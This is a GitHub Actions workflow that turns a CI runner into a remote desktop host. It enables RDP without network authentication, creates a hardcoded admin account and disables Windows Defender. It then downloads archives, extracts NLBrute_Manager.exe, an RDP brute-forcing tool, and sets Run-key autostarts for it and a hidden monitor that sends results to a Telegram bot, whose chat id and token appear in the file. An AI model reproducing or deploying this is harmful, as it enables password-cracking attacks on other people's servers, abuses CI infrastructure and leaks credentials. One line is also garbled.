name: Windows Cloud RDP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Enable Remote Desktop & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 2. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
          net user runneradmin P@ssw0rd1qazXSW@#

      - name: 3. Install & Connect Tailscale VPN
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          Start-Sleep -Seconds 5
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp-server"
          Start-Sleep -Seconds 8
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          Write-Host "==================================================" -ForegroundColor Green
          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
          Write-Host "==================================================" -ForegroundColor Green

      - name: 4. Deploy, Extract and Setup Autostart
        shell: powershell
        run: |
          # 1. Setup Workspace
          $workDir = "C:\target_app"
          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
          New-Item -ItemType Directory -Path $workDir -Force | Out-Null
          Set-Location -Path $workDir

          # 2. Disable Security
          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableIOAVProtection $true
          Set-MpPreference -DisableBehaviorMonitoring $true
          Set-MpPreference -DisableScriptScanning $true

          # 3. Download Initial Split Zip Files
          $filesToDownload = @(
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z01",
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z02",
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z03",
            "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.zip"
          )

          Write-Host "Downloading files..." -ForegroundColor Yellow
          foreach ($url in $filesToDownload) {
              $fileName = Split-Path $url -Leaf
              Invoke-WebRequest -Uri $url -OutFile "$workDir\$fileName"
          }

          # 4. Deep Extraction Loop
          Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
          $maxIterations = 5
          $iteration = 0
          $foundZip = $true

          while ($foundZip -and $iteration -lt $maxIterations) {
              $iteration++
              Write-Host "Iteration: ${iteration}" -ForegroundColor Yellow
              $zips = Get-ChildItem -Path $workDir -Filter "*.zip" -Recurse
              if ($zips.Count -eq 0) { $foundZip = $false } 
              else {
                  foreach ($zip in $zips) {
                      Write-Host "Extracting: $($zip.FullName)" -ForegroundColor Cyan
                      $targetFolder = $zip.DirectoryName
                      & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
                      Start-Sleep -Seconds 3
                  }
                  $foundZip = $true 
              }
          }

          # 5. Targeted Search and Autostart Configuration
          # APP 1: NLBrute_Manager.exe
          $targetExe1 = "NLBrute_Manager.exe"
          $exeFile1 = Get-ChildItem -Path $workDir -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

          if ($exeFile1) {
              $exePath1 = $exeFile1.FullName
              $exeDir1 = Split-Path $exePath1 -Parent
              Write-Host "SUCCESS! Found App 1: $exePath1" -ForegroundColor Green

              # VBScript for App 1 (GUI)
              $vbsFile1 = "$workDir\launcher_manager.vbs"
              $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n"
              $vbsContent1 += 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n"
              $vbsContent1 += 'WshShell.Run "' + $exePath1 + '", 1, False'
              $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii

              # Registry for App 1
              $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
          }

          # APP 2: good.txt-monitor.exe
          $targetExe2 = "good.txt-monitor.exe"
          $exeFile2 = Get-ChildItem -Path $workDir -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

          if ($exeFile2) {
              $exePath2 = $exeFile2.FullName
              $exeDir2 = Split-Split-Path $exePath2 -Parent # Use manual split if needed
              $exeDir2 = Split-Path $exePath2 -Parent
              
              # Parameters for the monitor
              $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
              
              Write-Host "SUCCESS! Found Monitor: $exePath2" -ForegroundColor Green

              # VBScript for App 2 (CMD/Background)
              # We use a slightly different VBS call to handle arguments correctly
              $vbsFile2 = "$workDir\launcher_monitor.vbs"
              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n"
              $vbsContent2 += 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n"
              $vbsContent2 += 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
              
              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii

              # Registry for App 2
              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
              
              Write-Host "Monitor Autostart configured." -ForegroundColor Cyan
          }

          Write-Host "All Autostarts configured. Check RDP session." -ForegroundColor Green

      - name: 5. Keep Server Alive (48 Hours)
        run: |
          for ($i = 1; $i -le 2880; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[$i/2880] Server running..."
          }
